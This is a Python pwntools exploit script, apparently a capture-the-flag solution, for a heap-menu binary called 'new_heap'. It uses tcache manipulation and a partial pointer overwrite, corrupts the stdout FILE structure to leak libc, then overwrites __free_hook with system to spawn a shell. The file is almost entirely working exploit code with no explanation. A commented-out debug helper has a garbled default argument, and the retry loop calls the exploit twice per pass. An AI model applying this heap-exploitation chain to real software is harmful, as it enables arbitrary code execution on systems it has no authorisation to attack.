from pwn import *
import sys, os
context.log_level = 'debug'
prog = './new_heap'
elf = ELF(prog)
libc = ELF("./libc.so.6")

#p = remote("")
'''
def debug(addr, sh,PIE=Tp.recvuntile): 
	io = sh 
	if PIE: 
		proc_base = p.libs()[p.cwd + p.argv[0].strip('.')] 
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16) 
		gdb.attach(io,'b *{}'.format(hex(text_base+addr))) 
	else: gdb.attach(io,"b *{}".format(hex(addr)))
'''
def dbg():
    gdb.attach(p)
    p.interactive()

def add(size, content):
	p.sendafter("exit\n", str(1).ljust(0x7, '\x00'))
	p.sendafter("size:", str(size).ljust(0x7, '\x00'))
	p.sendafter("content:", content)
def add1(size, content):
	p.sendafter("exit", str(1).ljust(0x7, '\x00'))
	p.sendafter("size:", str(size).ljust(0x7, '\x00'))
	p.sendafter("content:", content)
def free(idx):
	p.sendafter("exit\n", str(2).ljust(0x7, '\x00'))
	p.sendafter("index:", str(idx).ljust(0x7, '\x00'))
def qu():
	p.sendafter("exit\n", str(3).ljust(0x7, '\x00'))
	p.sendafter("sure?\n", '\x00')
def exp():
	global p
	p = process(prog,env={"LD_PRELOAD":"./libc.so.6"})
	p.recvuntil("friends:0x")
	byte = int(p.recv(2),16)-0x2 
	log.info('byte:'+hex(byte))
	add(0x78, '/bin/sh\x00')#0
	add(0x78, 'b')#1
	add(0x78, 'c')#2
	add(0x78, 'd')#3
	add(0x78, p64(0)*11+p64(0x81))#4
	add(0x38, 'g')#5
	add(0x78, p64(0)*3+p64(0x61))#6
	add(0x78, 'i')#7
	add(0x78, 'j')#8
	for i in range(9):
		if i == 5:
			continue
		free(i)
	add(0x78, 'h')#9
	free(8)
	add(0x78, '\xb0'+chr(byte+0x4))#10
	qu()
	free(5)
	add(10, 'a')#11
	add(10, '\x50\x77')#12
	add(0x38, 'a')#13
	try:
		add(0x38, p64(0)*2+p64(0xfbad1800)+p64(0)*3+'\x00')#13
	except:
		p.close()
		return False
	p.recv(8)
	libc_base = u64(p.recv(6)+'\x00'*2)-3889296
	if libc_base&0xFF!=0x00:
		p.close()
		return False
	log.info('libc: '+hex(libc_base))
	free_hook = libc_base + libc.sym['__free_hook']
	system = libc_base + libc.sym['system']
	add1(0x30, p64(0)*3+p64(0x81)+p64(free_hook))#14
	add1(0x70, 'a')
	add1(0x70, p64(system))
	p.sendlineafter("exit", '2')
	p.sendlineafter("index:", '0')
	p.interactive()
if __name__ == '__main__':
	while not exp():	
		exp()